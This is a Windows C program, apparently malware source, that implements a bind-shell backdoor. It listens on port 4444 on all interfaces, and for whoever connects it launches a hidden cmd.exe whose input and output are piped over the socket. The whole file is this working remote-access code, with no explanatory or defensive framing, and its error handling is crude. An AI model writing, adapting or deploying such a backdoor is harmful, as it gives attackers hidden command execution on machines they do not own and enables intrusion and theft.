#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define PORT 4444

SOCKET ServerSocket = INVALID_SOCKET;
SOCKET ClientSocket = INVALID_SOCKET;
HANDLE hReadPipe, hWritePipe, hWriteFile, hReadFile;
u_char varRead, varWrite;

DWORD WINAPI ThreadRead( LPVOID lParam )
{
	SECURITY_ATTRIBUTES sa;
	DWORD n, nWritten;
	char szBuffer[1024];
	int ret;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	ret = CreatePipe(&hReadPipe, 
		&hWriteFile, 
		&sa, 
		0);
	if (ret == 0)
	{
		printf("CreatePipe hReadPipe hWriteFile error!\n");
		exit(1);
	}
	varRead = 1;

	char szPath[MAX_PATH];
	DWORD Len = 0;

	Len = GetCurrentDirectory(MAX_PATH, szPath);
	szPath[Len] = '>';
	ret = WriteFile(hWriteFile, szPath, Len+1, &Len, NULL);

	while (1)
	{
		Sleep(100);
		n = recv(ClientSocket,
			szBuffer,
			sizeof(szBuffer),
			0);
		ret = WriteFile(hWriteFile, 
			szBuffer, 
			n, 
			&nWritten, 
			NULL);
	}
	return 0;
}


DWORD WINAPI ThreadWrite( LPVOID lParam )
{
	SECURITY_ATTRIBUTES sa;
	char szBuffer[1024];
	int ret;
	DWORD len;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	ret = CreatePipe(&hReadFile, 
		&hWritePipe, 
		&sa, 
		0);
	if (ret == 0)
	{
		printf("CreatePipe hReadFile hWritePipe error!\n");
		exit(1);
	}
	
	varWrite = 1;
	while (1)
	{
		Sleep(250);
		ReadFile(hReadFile,
			szBuffer,
			sizeof(szBuffer),
			&len,
			0);
		if (len != 0)
		{
			send(ClientSocket, szBuffer, len, 0);
		}
	}
	return 0;
}


int main()
{
	WSADATA wsaData;
	struct sockaddr_in RemoteAddr;
	int ret;
	DWORD dwReadId, dwWriteId, dwParam = 0;
	OSVERSIONINFO os;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	ret = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (ret != 0)
	{
		printf("WSAStartup error!\n");
		return 0;
	}

	ServerSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (ServerSocket == INVALID_SOCKET)
	{
		printf("socket error!\n");
		return 0;
	}

	RemoteAddr.sin_port = htons(PORT);
	RemoteAddr.sin_family = AF_INET;
	RemoteAddr.sin_addr.S_un.S_addr = INADDR_ANY;

	ret = bind(ServerSocket, 
		(const sockaddr*)&RemoteAddr, 
		sizeof(RemoteAddr));
	if (ret == SOCKET_ERROR)
	{
		printf("Bind error!\n");
		return 0;
	}

	ret = listen(ServerSocket, 5);
	if (ret == SOCKET_ERROR)
	{
		printf("listen error!\n");
		return 0;
	}

	varRead = varWrite = 0;

	ClientSocket = accept(ServerSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET)
	{
		printf("accept error!\n");
		return 0;
	}

	CreateThread(NULL, 0, ThreadRead, NULL, 0, &dwReadId);
	CreateThread(NULL, 0, ThreadWrite, NULL, 0, &dwWriteId);

	do
	{
		Sleep(100);
	} while((varRead || varWrite) == 0);

	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.hStdInput = hReadPipe;
	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;
	si.wShowWindow = SW_HIDE;

	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&os);

	char sys[MAX_PATH];
	GetSystemDirectory(sys, sizeof(sys));
	strcat(sys, "\\cmd.exe");

	CreateProcess(sys, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

	while (1)
	{
		ClientSocket = accept(ServerSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET)
		{
			printf("Accept error!\n");
			return 0;
		}
		Sleep(100);
	}
	return 0;
}